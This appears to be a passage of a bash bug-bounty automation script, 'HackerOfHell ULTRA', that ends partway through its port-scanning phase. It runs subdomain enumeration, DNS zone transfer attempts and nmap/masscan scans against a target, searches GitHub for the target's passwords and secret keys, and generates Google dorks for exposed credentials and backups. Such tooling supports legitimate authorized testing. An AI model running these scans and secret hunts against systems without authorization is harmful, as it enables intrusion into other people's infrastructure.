#!/usr/bin/env bash
# ┌─────────────────────────────────────────────────────────────────────────────────┐
# │                                                                                 │
# │  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗  ██████╗ ███████╗           │
# │  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝           │
# │  ███████║███████║██║     █████╔╝ █████╗  ██████╔╝██║   ██║███████╗           │
# │  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║╚════██║           │
# │  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║╚██████╔╝███████║           │
# │  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝           │
# │                                                                                 │
# │              U L T R A   v 5 . 0  —  M A D E   I N   H E L L                 │
# │                                                                                 │
# │   Author  : RAJ CHOUDHARY                                                     │
# │   Handle  : HACKEROFHELL                                                      │
# │   Version : 5.0 ULTRA — 50x Power Edition                                    │
# │   Phases  : 20 Automated Phases                                               │
# │   Modules : 80+ Attack Techniques                                             │
# │   Mission : Give target. Get ALL bugs. Automatically.                         │
# │                                                                                 │
# │   "Built by a man from Hell — for bug bounty hunters from Hell"               │
# │                                                                                 │
# └─────────────────────────────────────────────────────────────────────────────────┘
#
# LEGAL: Authorized testing ONLY. You are responsible for your actions.
#        Unauthorized use is illegal. Author not liable for misuse.
#
# USAGE:
#   sudo bash hackerofhell_ultra.sh -t target.com
#   sudo bash hackerofhell_ultra.sh -t 192.168.1.1
#   sudo bash hackerofhell_ultra.sh -t target.com --ultra --deep --chain
#
# ONE COMMAND → 20 PHASES → ALL BUGS → FULL REPORT

set -uo pipefail

# ══════════════════════════════════════════════════════════════════════
#  ARGUMENT PARSING
# ══════════════════════════════════════════════════════════════════════
TARGET=""
OUTBASE="$HOME/hackerofhell_ultra"
MODE="normal"         # passive | normal | ultra
RATE=200
THREADS=50
PROXY=""
WEBHOOK=""
SCOPE_FILE=""
SKIP_HEAVY=false
DEEP=false
CHAIN_MODE=false
API_SHODAN=""
API_GITHUB=""
CUSTOM_WL=""
AUTO_INSTALL=false

usage() {
cat << 'USAGE'
╔══════════════════════════════════════════════════════════════════╗
║         HACKEROFHELL ULTRA v5.0 — by RAJESH BAJIYA              ║
╠══════════════════════════════════════════════════════════════════╣
║  USAGE:                                                          ║
║    sudo bash hackerofhell_ultra.sh -t <target> [OPTIONS]        ║
║                                                                  ║
║  TARGET (required):                                              ║
║    -t  target.com OR 192.168.1.1 OR https://target.com          ║
║                                                                  ║
║  OUTPUT:                                                         ║
║    -o  ~/output_dir        Output directory                      ║
║                                                                  ║
║  SCAN MODE:                                                      ║
║    -m  passive|normal|ultra                                      ║
║    --deep       Full 65535-port scan + all modules               ║
║    --ultra      Maximum depth on all attacks                     ║
║    --chain      Enable bug chain escalation analysis             ║
║    --skip-heavy Skip slow modules (sqlmap/brute)                 ║
║                                                                  ║
║  INTEGRATIONS:                                                   ║
║    -p  http://127.0.0.1:8080    Proxy (Burp Suite)              ║
║    -n  https://hooks.slack.com/...   Slack/Discord webhook       ║
║    --shodan  YOUR_KEY         Shodan API key                     ║
║    --github  YOUR_TOKEN       GitHub API token (secret leaks)   ║
║                                                                  ║
║  OTHER:                                                          ║
║    -r  200      Rate limit (req/sec)                             ║
║    -T  50       Thread count                                     ║
║    -w  list.txt Custom wordlist                                  ║
║    --auto-install  Auto-install missing tools                    ║
║    -h           Show this help                                   ║
╚══════════════════════════════════════════════════════════════════╝
USAGE
  exit 0
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target)    TARGET="$2"; shift 2 ;;
    -o|--output)    OUTBASE="$2"; shift 2 ;;
    -m|--mode)      MODE="$2"; shift 2 ;;
    -r|--rate)      RATE="$2"; shift 2 ;;
    -T|--threads)   THREADS="$2"; shift 2 ;;
    -p|--proxy)     PROXY="$2"; shift 2 ;;
    -n|--notify)    WEBHOOK="$2"; shift 2 ;;
    -s|--scope)     SCOPE_FILE="$2"; shift 2 ;;
    -w|--wordlist)  CUSTOM_WL="$2"; shift 2 ;;
    --shodan)       API_SHODAN="$2"; shift 2 ;;
    --github)       API_GITHUB="$2"; shift 2 ;;
    --deep)         DEEP=true; shift ;;
    --ultra)        MODE="ultra"; shift ;;
    --chain)        CHAIN_MODE=true; shift ;;
    --skip-heavy)   SKIP_HEAVY=true; shift ;;
    --auto-install) AUTO_INSTALL=true; shift ;;
    -h|--help)      usage ;;
    *)              shift ;;
  esac
done

[[ -z "$TARGET" ]] && { echo "ERROR: -t target.com required"; usage; }

# Clean target — strip protocol if given
TARGET="${TARGET#http://}"; TARGET="${TARGET#https://}"; TARGET="${TARGET%%/*}"

# ══════════════════════════════════════════════════════════════════════
#  DIRECTORY SETUP
# ══════════════════════════════════════════════════════════════════════
TS=$(date +%Y%m%d_%H%M%S)
OUTDIR="$OUTBASE/$TARGET"
P01="$OUTDIR/01_osint_intel"
P02="$OUTDIR/02_infrastructure"
P03="$OUTDIR/03_fingerprint"
P04="$OUTDIR/04_content_discovery"
P05="$OUTDIR/05_param_mining"
P06="$OUTDIR/06_authentication"
P07="$OUTDIR/07_injection"
P08="$OUTDIR/08_client_side"
P09="$OUTDIR/09_server_side"
P10="$OUTDIR/10_access_control"
P11="$OUTDIR/11_business_logic"
P12="$OUTDIR/12_api_security"
P13="$OUTDIR/13_infrastructure_cloud"
P14="$OUTDIR/14_secrets_exposure"
P15="$OUTDIR/15_cve_exploits"
P16="$OUTDIR/16_subdomain_attacks"
P17="$OUTDIR/17_network_layer"
P18="$OUTDIR/18_chain_analysis"
P19="$OUTDIR/19_verification"
P20="$OUTDIR/20_report"
TMPD="$OUTDIR/.tmp"
LOG="$OUTDIR/hackerofhell_ultra.log"
FINDINGS="$OUTDIR/findings_ultra.json"

for d in "$P01" "$P02" "$P03" "$P04" "$P05" "$P06" "$P07" "$P08" \
          "$P09" "$P10" "$P11" "$P12" "$P13" "$P14" "$P15" "$P16" \
          "$P17" "$P18" "$P19" "$P20" "$TMPD"; do
  mkdir -p "$d"
done

# ══════════════════════════════════════════════════════════════════════
#  COLORS & LOGGING
# ══════════════════════════════════════════════════════════════════════
NC='\033[0m';    BOLD='\033[1m';  DIM='\033[2m'; BLINK='\033[5m'
RED='\033[0;31m';  GRN='\033[0;32m'; YLW='\033[1;33m'
CYN='\033[0;36m';  MAG='\033[0;35m'; BLU='\033[1;34m'
WHT='\033[1;37m';  BRED='\033[1;31m'; BGRN='\033[1;32m'

_ts()    { date '+%H:%M:%S'; }
log()    { echo -e "${CYN}[$(_ts)][*]${NC} $*" | tee -a "$LOG"; }
ok()     { echo -e "${GRN}[$(_ts)][+]${NC} ${BOLD}$*${NC}" | tee -a "$LOG"; }
vuln()   { echo -e "${BRED}[$(_ts)][VULN]${NC}${BLINK}★${NC}${BOLD} $*${NC}" | tee -a "$LOG"; }
crit()   { echo -e "${BRED}[$(_ts)][CRITICAL]${NC}${BLINK}☠${NC}${BOLD} $*${NC}" | tee -a "$LOG"; }
warn()   { echo -e "${YLW}[$(_ts)][!]${NC} $*" | tee -a "$LOG"; }
info()   { echo -e "${BLU}[$(_ts)][i]${NC} $*" | tee -a "$LOG"; }
skip()   { echo -e "${DIM}[$(_ts)][-] SKIP: $*${NC}" | tee -a "$LOG"; }
chain()  { echo -e "${MAG}[$(_ts)][⛓ CHAIN]${NC}${BOLD} $*${NC}" | tee -a "$LOG"; }

phase_banner() {
  local n="$1" t="$2" d="$3"
  echo "" | tee -a "$LOG"
  echo -e "${MAG}${BOLD}" | tee -a "$LOG"
  echo "  ╔═══════════════════════════════════════════════════════════════╗" | tee -a "$LOG"
  printf "  ║  PHASE %-2s %-52s║\n" "$n" "— $t" | tee -a "$LOG"
  printf "  ║  %-63s║\n" "$d" | tee -a "$LOG"
  echo "  ╚═══════════════════════════════════════════════════════════════╝" | tee -a "$LOG"
  echo -e "${NC}" | tee -a "$LOG"
}

# ══════════════════════════════════════════════════════════════════════
#  FINDINGS DATABASE
# ══════════════════════════════════════════════════════════════════════
python3 -c "
import json
data = {
  'target': '$TARGET',
  'author': 'RAJESH BAJIYA',
  'handle': 'HACKEROFHELL',
  'tool': 'HackerOfHell ULTRA v5.0',
  'date': '$(date -u +%Y-%m-%dT%H:%M:%SZ)',
  'mode': '$MODE',
  'findings': [],
  'chains': [],
  'stats': {}
}
with open('$FINDINGS', 'w') as f:
    json.dump(data, f, indent=2)
" 2>/dev/null

add_finding() {
  # $1=title $2=severity $3=cvss $4=tool $5=url $6=param $7=evidence $8=poc $9=remediation $10=category
  local title="$1" sev="$2" cvss="$3" tool="$4" url="$5"
  local param="${6:--}" evidence="${7:-}" poc="${8:-}" rem="${9:-Review and patch}" cat="${10:-web}"
  python3 - <<PYEOF 2>/dev/null || true
import json
try:
    with open('$FINDINGS') as f: d = json.load(f)
    d['findings'].append({
        'title': '''$title''', 'severity': '$sev', 'cvss': '$cvss',
        'tool': '$tool', 'url': '''$url''', 'parameter': '''$param''',
        'category': '$cat', 'evidence': '''$evidence''',
        'poc': '''$poc''', 'remediation': '''$rem'''
    })
    with open('$FINDINGS', 'w') as f: json.dump(d, f, indent=2)
except Exception as e: pass
PYEOF
  # Instant notification on critical/high
  [[ "$sev" == "CRITICAL" || "$sev" == "HIGH" ]] && notify_webhook "[$sev] $title on $TARGET"
}

add_chain() {
  local name="$1" impact="$2" cvss="$3" desc="$4" steps="$5"
  python3 - <<PYEOF 2>/dev/null || true
import json
try:
    with open('$FINDINGS') as f: d = json.load(f)
    d['chains'].append({
        'name': '''$name''', 'impact': '$impact', 'cvss': '$cvss',
        'description': '''$desc''', 'steps': '''$steps'''
    })
    with open('$FINDINGS', 'w') as f: json.dump(d, f, indent=2)
except: pass
PYEOF
}

notify_webhook() {
  [[ -z "$WEBHOOK" ]] && return
  local msg="$1"
  curl -sk -X POST "$WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "{\"text\":\"⚡ [HACKEROFHELL] $TARGET — $msg\"}" &>/dev/null &
}

# ══════════════════════════════════════════════════════════════════════
#  TOOL AVAILABILITY CHECK + AUTO-INSTALL
# ══════════════════════════════════════════════════════════════════════
has() { command -v "$1" &>/dev/null; }

auto_install_tools() {
  [[ "$AUTO_INSTALL" != "true" ]] && return
  log "Auto-installing missing tools..."
  local apt_tools="nmap masscan gobuster ffuf sqlmap whatweb wafw00f wpscan seclists curl python3 python3-pip tmux dnsutils whois golang-go"
  local go_tools=(
    "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    "github.com/owasp-amass/amass/v4/...@master"
    "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    "github.com/projectdiscovery/httpx/cmd/httpx@latest"
    "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    "github.com/projectdiscovery/katana/cmd/katana@latest"
    "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
    "github.com/hahwul/dalfox/v2@latest"
    "github.com/lc/gau/v2/cmd/gau@latest"
    "github.com/tomnomnom/waybackurls@latest"
    "github.com/tomnomnom/anew@latest"
    "github.com/tomnomnom/qsreplace@latest"
    "github.com/tomnomnom/gf@latest"
    "github.com/s0md3v/uro@latest"
    "github.com/hakluke/hakrawler@latest"
    "github.com/hakluke/hakcheckurl@latest"
    "github.com/ffuf/ffuf/v2@latest"
    "github.com/epi052/feroxbuster@latest"
    "github.com/ameenmaali/wordlistgen@latest"
  )
  sudo apt-get install -y $apt_tools 2>/dev/null
  for pkg in "${go_tools[@]}"; do go install -v "$pkg" 2>/dev/null; done
  pip3 install arjun paramspider truffleHog gitdumper --break-system-packages 2>/dev/null
  export PATH="$PATH:$HOME/go/bin"
}

[[ "$AUTO_INSTALL" == "true" ]] && auto_install_tools
export PATH="$PATH:$HOME/go/bin"

# ══════════════════════════════════════════════════════════════════════
#  WORDLISTS
# ══════════════════════════════════════════════════════════════════════
SL="/usr/share/seclists"
WL_DIRS="${CUSTOM_WL:-$SL/Discovery/Web-Content/raft-large-directories.txt}"
WL_FILES="$SL/Discovery/Web-Content/raft-large-files.txt"
WL_ADMIN="$SL/Discovery/Web-Content/AdminPanels.txt"
WL_PARAMS="$SL/Discovery/Web-Content/burp-parameter-names.txt"
WL_SUBDOMS="$SL/Discovery/DNS/subdomains-top1million-110000.txt"
WL_API="$SL/Discovery/Web-Content/api/api-endpoints.txt"
WL_FUZZ_FAST="$SL/Discovery/Web-Content/common.txt"
WL_PASS="$SL/Passwords/Common-Credentials/10k-most-common.txt"
WL_USER="$SL/Usernames/top-usernames-shortlist.txt"
WL_LFI="$SL/Fuzzing/LFI/LFI-Jhaddix.txt"
WL_SQLI="$SL/Fuzzing/SQLi/Generic-SQLi.txt"
WL_XSS="$SL/Fuzzing/XSS/XSS-Jhaddix.txt"
WL_SSTI="$SL/Fuzzing/template-injection/polyglots.txt"
WL_BACKUP="$SL/Discovery/Web-Content/Common-DB-Backups.txt"
WL_TECH="$SL/Discovery/Web-Content/technology-specific"
WL_SECRETS="$SL/Discovery/Web-Content/sensitive-directories.txt"

# ══════════════════════════════════════════════════════════════════════
#  STARTUP BANNER
# ══════════════════════════════════════════════════════════════════════
clear
echo -e "${BRED}${BOLD}"
cat << 'BANNER'

  ┌────────────────────────────────────────────────────────────────────────────┐
  │                                                                            │
  │  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗  ██████╗ ███████╗      │
  │  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝      │
  │  ███████║███████║██║     █████╔╝ █████╗  ██████╔╝██║   ██║███████╗      │
  │  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║╚════██║      │
  │  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║╚██████╔╝███████║      │
  │  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝      │
  │                                                                            │
  │            U L T R A   v 5 . 0  —  M A D E   I N   H E L L              │
  │                                                                            │
  └────────────────────────────────────────────────────────────────────────────┘

BANNER
echo -e "${NC}"
echo -e "  ${MAG}${BOLD}Author   :${NC} ${WHT}RAJESH BAJIYA${NC}"
echo -e "  ${MAG}${BOLD}Handle   :${NC} ${BRED}${BOLD}HACKEROFHELL${NC}"
echo -e "  ${MAG}${BOLD}Target   :${NC} ${BGRN}${BOLD}$TARGET${NC}"
echo -e "  ${MAG}${BOLD}Mode     :${NC} ${YLW}${MODE^^}${NC}"
echo -e "  ${MAG}${BOLD}Output   :${NC} ${CYN}$OUTDIR${NC}"
echo -e "  ${MAG}${BOLD}Phases   :${NC} ${WHT}20 Phases / 80+ Attack Techniques${NC}"
echo -e "  ${MAG}${BOLD}Started  :${NC} ${DIM}$(date)${NC}"
echo ""
echo -e "  ${DIM}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "  ${DIM}║  AUTHORIZED TESTING ONLY — YOU ARE RESPONSIBLE FOR ACTIONS   ║${NC}"
echo -e "  ${DIM}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""
notify_webhook "Scan STARTED on $TARGET — Mode: ${MODE^^}"
sleep 1

# ══════════════════════════════════════════════════════════════════════
#  HELPER: CURL WRAPPER
# ══════════════════════════════════════════════════════════════════════
_curl() {
  local args=(-sk --max-time 15 --retry 2 -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
  [[ -n "$PROXY" ]] && args+=(-x "$PROXY")
  curl "${args[@]}" "$@"
}

_curl_code() { _curl -o /dev/null -w "%{http_code}" "$@" 2>/dev/null || echo "000"; }
_curl_body() { _curl "$@" 2>/dev/null || true; }
_curl_head() { _curl -I "$@" 2>/dev/null || true; }

# Detect if target is IP or domain
IS_IP=false
echo "$TARGET" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' && IS_IP=true

# Base URL
BASE_URL="https://$TARGET"
http_code=$(_curl_code "$BASE_URL")
if [[ "$http_code" == "000" ]]; then
  BASE_URL="http://$TARGET"
  http_code=$(_curl_code "$BASE_URL")
fi
ok "Base URL: $BASE_URL (HTTP $http_code)"

# ══════════════════════════════════════════════════════════════════════
# ██████╗ ██╗  ██╗ █████╗ ███████╗███████╗     ██╗
# ██╔══██╗██║  ██║██╔══██╗██╔════╝██╔════╝    ███║
# ██████╔╝███████║███████║███████╗█████╗      ╚██║
# ██╔═══╝ ██╔══██║██╔══██║╚════██║██╔══╝       ██║
# ██║     ██║  ██║██║  ██║███████║███████╗     ██║
# ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝     ╚═╝
# OSINT & INTELLIGENCE GATHERING
# ══════════════════════════════════════════════════════════════════════
phase_banner "01" "OSINT & INTELLIGENCE GATHERING" \
  "Subdomains · DNS · ASN · WHOIS · crt.sh · GitHub · Shodan · Emails"

# 1.1 Multi-source subdomain enumeration
log "Multi-source subdomain enumeration..."
> "$P01/all_subs.txt"

if has subfinder; then
  subfinder -d "$TARGET" -silent -all -t 100 \
    -o "$P01/subs_subfinder.txt" 2>/dev/null &
fi
if has amass; then
  amass enum -passive -d "$TARGET" -silent \
    -o "$P01/subs_amass.txt" 2>/dev/null &
fi
if [[ -f "$WL_SUBDOMS" ]] && has dnsx; then
  dnsx -d "$TARGET" -w "$WL_SUBDOMS" -silent \
    -o "$P01/subs_dns_brute.txt" 2>/dev/null &
fi

# Certificate Transparency — multiple logs
for API in \
  "https://crt.sh/?q=%25.$TARGET&output=json" \
  "https://api.certspotter.com/v1/issuances?domain=$TARGET&include_subdomains=true&expand=dns_names"; do
  curl -sk --max-time 20 "$API" 2>/dev/null >> "$P01/raw_certs.json" &
done

wait

# Parse cert logs
python3 - << PYEOF 2>/dev/null || true
import json, re, os
names = set()
try:
    with open('$P01/raw_certs.json') as f:
        raw = f.read()
    # Try as JSON array (crt.sh)
    for chunk in raw.replace('}{','}\n{').split('\n'):
        try:
            d = json.loads(chunk)
            if isinstance(d, list):
                for e in d:
                    for n in str(e.get('name_value','')).split('\n'):
                        n = n.strip().lstrip('*.').lower()
                        if n.endswith('$TARGET') and ' ' not in n: names.add(n)
        except: pass
    with open('$P01/subs_certs.txt','w') as f:
        f.write('\n'.join(sorted(names)))
except: pass
PYEOF

# 1.2 DNS Aggregation
cat "$P01"/subs_*.txt 2>/dev/null | sort -u | grep -v '^#' > "$P01/all_subs.txt"
TOTAL_SUBS=$(wc -l < "$P01/all_subs.txt" 2>/dev/null || echo 0)
ok "Total subdomains: $TOTAL_SUBS"

# 1.3 Full DNS Intelligence
log "DNS intelligence extraction..."
if has dnsx; then
  dnsx -l "$P01/all_subs.txt" \
    -a -aaaa -cname -mx -ns -txt -soa -resp \
    -silent -o "$P01/dns_records.txt" 2>/dev/null || true
fi

# 1.4 DNS Zone Transfer
log "DNS zone transfer attempt on all nameservers..."
while IFS= read -r ns; do
  [[ -z "$ns" ]] && continue
  AXFR=$(dig AXFR "$TARGET" @"$ns" 2>/dev/null || true)
  if echo "$AXFR" | grep -qv "Transfer failed"; then
    if echo "$AXFR" | grep -q " IN "; then
      crit "DNS ZONE TRANSFER via $ns"
      echo "$AXFR" > "$P01/zone_transfer_${ns}.txt"
      add_finding "DNS Zone Transfer" "HIGH" "7.5" "dig" \
        "$TARGET" "DNS NS: $ns" \
        "Full zone data exposed via $ns" \
        "dig AXFR $TARGET @$ns" \
        "Restrict AXFR to authorized secondaries. Disable public zone transfer." "dns"
    fi
  fi
done < <(dig NS "$TARGET" +short 2>/dev/null)

# 1.5 WHOIS + ASN + IP Ranges
log "WHOIS and ASN intelligence..."
whois "$TARGET" > "$P01/whois.txt" 2>/dev/null || true
TARGET_IP=$(dig +short "$TARGET" 2>/dev/null | grep -E '^[0-9]+\.' | head -1 || true)
if [[ -n "$TARGET_IP" ]]; then
  curl -sk "https://ipinfo.io/$TARGET_IP/json" > "$P01/ipinfo.json" 2>/dev/null || true
  ASN=$(python3 -c "import json; d=json.load(open('$P01/ipinfo.json')); print(d.get('org','unknown'))" 2>/dev/null || echo "unknown")
  ok "IP: $TARGET_IP | ASN: $ASN"
  echo "$TARGET_IP" > "$P01/target_ip.txt"

  # IP range from ASN — find all hosts in same org
  ASN_NUM=$(echo "$ASN" | grep -oP 'AS\d+' | head -1)
  if [[ -n "$ASN_NUM" ]]; then
    curl -sk "https://api.bgpview.io/asn/${ASN_NUM#AS}/prefixes" 2>/dev/null \
      | python3 -c "
import json,sys
try:
    d=json.load(sys.stdin)
    for p in d.get('data',{}).get('ipv4_prefixes',[]):
        print(p.get('prefix',''))
except: pass
" > "$P01/asn_ranges.txt" 2>/dev/null || true
  fi
fi

# 1.6 Historical URL Mining
log "Historical URL collection from 3 sources..."
if has gau; then
  gau "$TARGET" --threads 5 --retries 3 \
    --blacklist png,jpg,gif,css,woff,ico,svg,ttf,eot,woff2 \
    2>/dev/null > "$P01/urls_gau.txt" &
fi
if has waybackurls; then
  echo "$TARGET" | waybackurls 2>/dev/null > "$P01/urls_wayback.txt" &
fi
# Common Crawl
curl -sk "http://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.$TARGET&output=json&limit=5000" \
  2>/dev/null | python3 -c "
import json,sys
for line in sys.stdin:
  try:
    d=json.loads(line)
    print(d.get('url',''))
  except: pass
" > "$P01/urls_commoncrawl.txt" 2>/dev/null &
wait

cat "$P01"/urls_*.txt 2>/dev/null | sort -u | \
  grep -v '\.(png|jpg|gif|css|woff|ico|svg|ttf|pdf|zip)$' > "$P01/all_urls.txt"
TOTAL_URLS=$(wc -l < "$P01/all_urls.txt" 2>/dev/null || echo 0)
ok "Historical URLs: $TOTAL_URLS"

# 1.7 GitHub Secret Scanning
if [[ -n "$API_GITHUB" ]]; then
  log "GitHub reconnaissance for $TARGET..."
  GITHUB_RESULTS=$(curl -sk \
    -H "Authorization: token $API_GITHUB" \
    -H "Accept: application/vnd.github.v3+json" \
    "https://api.github.com/search/code?q=$TARGET+password+secret+key&per_page=20" \
    2>/dev/null || true)
  echo "$GITHUB_RESULTS" > "$P01/github_results.json"

  python3 - << PYEOF 2>/dev/null
import json
try:
    with open('$P01/github_results.json') as f:
        d = json.load(f)
    items = d.get('items', [])
    if items:
        print(f"[GITHUB] {len(items)} code results mentioning $TARGET credentials")
        for item in items[:5]:
            print(f"  - {item.get('html_url','')}")
except: pass
PYEOF
fi

# 1.8 Shodan Intelligence
if [[ -n "$API_SHODAN" ]]; then
  log "Shodan intelligence for $TARGET..."
  curl -sk "https://api.shodan.io/shodan/host/$TARGET_IP?key=$API_SHODAN" \
    2>/dev/null > "$P01/shodan_host.json" || true
  curl -sk "https://api.shodan.io/dns/domain/$TARGET?key=$API_SHODAN" \
    2>/dev/null > "$P01/shodan_dns.json" || true
  # Parse exposed ports/services from Shodan
  python3 - << PYEOF 2>/dev/null
import json
try:
    with open('$P01/shodan_host.json') as f:
        d = json.load(f)
    ports = d.get('ports', [])
    vulns = d.get('vulns', {})
    print(f"[SHODAN] Open ports: {ports}")
    if vulns:
        print(f"[SHODAN] CVEs: {list(vulns.keys())[:10]}")
        for cve, info in vulns.items():
            cvss = info.get('cvss', 0)
            print(f"  {cve}: CVSS {cvss} — {info.get('summary','')[:100]}")
except: pass
PYEOF
fi

# 1.9 Email Harvesting
log "Email + personnel OSINT..."
_curl_body "https://api.hunter.io/v2/domain-search?domain=$TARGET&limit=20&api_key=none" \
  2>/dev/null | python3 -c "
import json,sys
try:
  d=json.load(sys.stdin)
  for e in d.get('data',{}).get('emails',[]): print(e.get('value',''))
except: pass
" > "$P01/emails.txt" 2>/dev/null || true

# 1.10 Google Dorks Generation
cat > "$P01/google_dorks.txt" << DORKS
# == HACKEROFHELL AUTO-GENERATED DORKS for $TARGET ==
# Run each in Google manually for OSINT

site:$TARGET inurl:admin
site:$TARGET inurl:login
site:$TARGET inurl:dashboard
site:$TARGET inurl:portal
site:$TARGET inurl:upload
site:$TARGET inurl:config
site:$TARGET inurl:backup
site:$TARGET inurl:debug
site:$TARGET inurl:test
site:$TARGET inurl:dev
site:$TARGET inurl:staging
site:$TARGET inurl:api
site:$TARGET inurl:swagger
site:$TARGET inurl:graphql
site:$TARGET ext:php inurl:?id=
site:$TARGET ext:asp inurl:?id=
site:$TARGET ext:env
site:$TARGET ext:sql
site:$TARGET ext:log
site:$TARGET ext:bak
site:$TARGET ext:old
site:$TARGET ext:conf
site:$TARGET "index of /"
site:$TARGET "index of /admin"
site:$TARGET "index of /backup"
site:$TARGET "Apache/2" OR "nginx/" -site:$TARGET
site:$TARGET "error" OR "exception" OR "stack trace"
site:$TARGET "password" OR "passwd" OR "credentials"
site:$TARGET "database error" OR "SQL syntax"
site:$TARGET "Warning: mysql_" OR "ORA-"
site:$TARGET filetype:pdf
site:$TARGET filetype:xlsx OR filetype:csv
"$TARGET" site:github.com
"$TARGET" site:pastebin.com
"$TARGET" site:trello.com
"$TARGET" site:jira.* inurl:browse
"$TARGET" site:confluence.*
"$TARGET" password
"$TARGET" secret key
"$TARGET" api_key
DORKS

ok "Phase 01 complete — Subdomains: $TOTAL_SUBS | URLs: $TOTAL_URLS"

# ══════════════════════════════════════════════════════════════════════
# PHASE 02 — INFRASTRUCTURE MAPPING
# ══════════════════════════════════════════════════════════════════════
phase_banner "02" "INFRASTRUCTURE MAPPING" \
  "Nmap · Masscan · Port Analysis · Service Detection · CDN Bypass · Cloud Detection"

# 2.1 Fast Port Discovery with masscan/nmap
log "Fast port discovery..."
if has masscan && [[ "$DEEP" == "true" ]]; then
  sudo masscan "$TARGET" -p 1-65535 --rate 10000 \
    -oG "$P02/masscan_all.txt" 2>/dev/null || true
  OPEN_PORTS=$(grep "open" "$P02/masscan_all.txt" 2>/dev/null \
    | awk '{print $4}' | cut -d'/' -f1 | sort -n | tr '\n' ',' | sed 's/,$//')
else
  nmap -sS -T4 --open --top-ports 1000 \
    -oN "$P02/nmap_top1000.txt" \
    -oX "$P02/nmap_top1000.xml" \
    "$TARGET" 2>/dev/null || true
  OPEN_PORTS=$(grep '/tcp.*open' "$P02/nmap_top1000.txt" 2>/dev/null \
    | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//' || echo "80,443")
fi

ok "Open ports: ${OPEN_PORTS:-none found}"
echo "${OPEN_PORTS:-}" > "$P02/open_ports.txt"

# 2.2 Service version detection on open ports
if [[ -n "${OPEN_PORTS:-}" ]]; then
  log "Service detection on open ports..."
  nmap -sV -sC -A --open -p "${OPEN_PORTS}" \
    --script "default,vuln,safe" \
    -oN "$P02/nmap_services.txt" \
    -oX "$P02/nmap_services.xml" \
    "$TARGET" 2>/dev/null || true
fi

# 2.3 Deep full port scan (--deep mode)
if [[ "$DEEP" == "true" ]]; then
  log "Deep: Full 65535-port scan running in background..."
  nmap -sS -T3 --open -p- \
    -oN "$P02/nmap_full.txt" \
    "$TARGET" 2>/dev/null &
fi

# 2.4 UDP scan — top dangerous UDP ports
log "UDP scan (top 50 dangerous ports)..."
sudo nmap -sU --open \
  -p 53,67,68,69,111,123,137,138,139,161,162,389,500,514,520,623,\
631,1194,1434,1900,2049,4500,5353,5683,11211,17185,27015,33848,44818 \
  -oN "$P02/nmap_udp.txt" \
  "$TARGET" 2>/dev/null || true

# 2.5 Dangerous service detection + findings
declare -A DANGEROUS=(
  ["21"]="FTP:HIGH:8.5:FTP allows anonymous auth or clear-text credential transmission"
  ["22"]="SSH:INFO:2.0:SSH exposed - check for weak credentials"
  ["23"]="Telnet:CRITICAL:9.1:Telnet is unencrypted - credentials transmitted in plaintext"
  ["25"]="SMTP:MEDIUM:5.3:Open SMTP relay or email enumeration possible"
  ["53"]="DNS:MEDIUM:5.3:DNS service exposed - zone transfer and cache poisoning risk"
  ["110"]="POP3:MEDIUM:5.3:POP3 exposed - email interception risk"
  ["111"]="RPC:HIGH:7.5:RPC portmapper exposed - service enumeration"
  ["139"]="NetBIOS:HIGH:7.5:NetBIOS exposed - network info leakage"
  ["445"]="SMB:CRITICAL:9.3:SMB exposed - EternalBlue/WannaCry/pass-the-hash risk"
  ["1433"]="MSSQL:CRITICAL:9.8:MSSQL database exposed directly to internet"
  ["1521"]="Oracle:CRITICAL:9.8:Oracle DB exposed to internet"
  ["2049"]="NFS:HIGH:8.1:NFS exposed - potential mount and file access"
  ["2375"]="Docker-API:CRITICAL:9.9:Docker daemon exposed WITHOUT TLS - full system compromise"
  ["2376"]="Docker-TLS:HIGH:7.5:Docker TLS exposed - check cert validation"
  ["3306"]="MySQL:CRITICAL:9.8:MySQL database exposed to internet"
  ["3389"]="RDP:HIGH:8.8:RDP exposed - BlueKeep/DejaBlue/brute force risk"
  ["4369"]="RabbitMQ:HIGH:8.1:Erlang Port Mapper Daemon exposed"
  ["5000"]="Docker-Registry:HIGH:7.5:Docker Registry exposed - pull/push images"
  ["5432"]="PostgreSQL:CRITICAL:9.8:PostgreSQL database exposed to internet"
  ["5672"]="RabbitMQ:HIGH:7.5:RabbitMQ AMQP exposed"
  ["5900"]="VNC:HIGH:8.1:VNC exposed - remote desktop takeover risk"
  ["5984"]="CouchDB:CRITICAL:9.8:CouchDB - often unauthenticated /admin access"
  ["6379"]="Redis:CRITICAL:9.9:Redis exposed - no auth = full data access + RCE via config"
  ["7001"]="WebLogic:CRITICAL:9.8:Oracle WebLogic - known RCE vulnerabilities"
  ["8080"]="HTTP-Alt:MEDIUM:5.3:Alternate HTTP port - may host admin/dev panels"
  ["8443"]="HTTPS-Alt:MEDIUM:5.3:Alternate HTTPS port"
